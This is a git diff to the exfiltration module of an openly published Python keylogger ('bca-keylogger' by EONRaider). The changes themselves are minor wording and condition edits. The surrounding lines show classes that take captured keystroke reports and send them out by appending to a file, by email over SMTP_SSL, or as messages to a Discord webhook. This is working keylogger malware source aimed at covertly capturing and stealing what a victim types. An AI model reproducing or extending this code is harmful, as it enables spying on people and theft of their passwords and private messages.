@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/Keylogger
+# https://github.com/EONRaider/bca-keylogger
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
@@ -23,10 +23,10 @@ class Exfiltrator(abc.ABC):
 
         Args:
             keylogger (KeyLogger): Instance to which the exfiltrator
-                will attach itself to as a subscriber.
+                will attach itself as a subscriber.
             tag (str): A unique identifier for the current host.
                 Defaults to a string with a format similar to
-                KeyLogger::Discord::computer001 if None.
+                KeyLogger::Discord::hostname if None.
         """
 
         self.keylogger = keylogger
@@ -43,8 +43,8 @@ class Exfiltrator(abc.ABC):
         timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
         header = f"[{self.tag}] @ {timestamp}"
         '''The standard report is formatted as follows:
-        KeyLogger::Discord::computer001 @ 10/16/2021 13:30:20 - data'''
-        if self.keylogger.has_data:
+        KeyLogger::Discord::hostname @ 10/16/2021 13:30:20 - my data'''
+        if self.keylogger.has_data is True:
             return f"{header} - {self.keylogger.contents}"
         return f"{header} - <NO INPUT>"
 
@@ -77,7 +77,7 @@ class TextFile(Exfiltrator):
     def update(self) -> None:
         """Write each report on a new line of a text file with the
         specified path."""
-        if self.keylogger.has_data:
+        if self.keylogger.has_data is True:
             with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                 file.write(f"{self.report}\n")
 
@@ -98,8 +98,8 @@ class Email(Exfiltrator):
 
     def update(self):
         """Send each report as an email through a secure connection
-        using SMTP"""
-        if self.keylogger.has_data:
+        using SMTP."""
+        if self.keylogger.has_data is True:
             with smtplib.SMTP_SSL(
                     host=self.smtp_host,
                     port=self.smtp_port,
@@ -122,7 +122,7 @@ class Discord(Exfiltrator):
     def update(self) -> None:
         """Send each report as a new message to a Discord server with a
         Webhook URL enabled."""
-        if self.keylogger.has_data:
+        if self.keylogger.has_data is True:
             asyncio.run(self.send_message())
 
     async def send_message(self) -> None:
